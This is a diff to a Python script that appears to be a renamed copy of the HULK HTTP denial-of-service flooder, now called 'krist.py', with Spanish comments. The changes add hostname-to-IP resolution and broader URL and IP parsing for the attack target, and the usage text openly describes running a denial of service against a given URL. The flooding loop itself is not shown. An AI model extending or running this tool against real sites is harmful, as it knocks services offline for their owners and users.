@@ -4,6 +4,8 @@ import threading
 import random
 import re
 import logging
+import socket
+import ipaddress
 
 # Configuración de registro
 logging.basicConfig(level=logging.INFO)
@@ -45,9 +47,17 @@ def set_safe_mode():
 
 def usage():
     print('---------------------------------------------------')
-    print('USO: python hulk.py <url>')
+    print('USO: python krist.py <url>')
     print('Puedes agregar "seguro" después de la URL para detener automáticamente después de la denegación de servicio (DoS).')
     print('---------------------------------------------------')
+
+def resolve_host(host):
+    try:
+        # Intenta resolver el nombre de host a una dirección IP
+        ip = socket.gethostbyname(host)
+        return ip
+    except socket.gaierror:
+        return None
 
 # Realiza una llamada HTTP
 def http_call(url):
@@ -111,11 +121,33 @@ if len(sys.argv) < 2 or sys.argv[1] == "help":
     sys.exit()
 
 target_url = sys.argv[1]
+
+# Modificamos la expresión regular para aceptar HTTP, HTTPS y direcciones IP
+match = re.search('https?://([^/]+)|(\d+\.\d+\.\d+\.\d+)', target_url)
+
+if match:
+    # La expresión regular puede coincidir con cualquiera de los dos patrones
+    host_from_url = match.group(1) or match.group(2)
+
+    # Verificamos si la entrada es una dirección IP válida
+    try:
+        ipaddress.ip_address(host_from_url)
+        target_host = host_from_url
+    except ValueError:
+        # Si no es una dirección IP válida, asumimos que es un nombre de host en lugar de una IP
+        # Realizamos resolución DNS para obtener la dirección IP real
+        resolved_ip = resolve_host(host_from_url)
+        if resolved_ip:
+            target_host = resolved_ip
+        else:
+            print(f'No se pudo resolver el nombre de host: {host_from_url}')
+            sys.exit(1)
+else:
+    print('La URL o dirección IP no es válida. Asegúrate de que esté en el formato correcto.')
+    sys.exit(1)
+
 if target_url.count("/") == 2:
     target_url += "/"
-
-match = re.search('http\://([^/]*)/?.*', target_url)
-target_host = match.group(1)
 
 if len(sys.argv) == 3 and sys.argv[2] == "seguro":
     set_safe_mode()
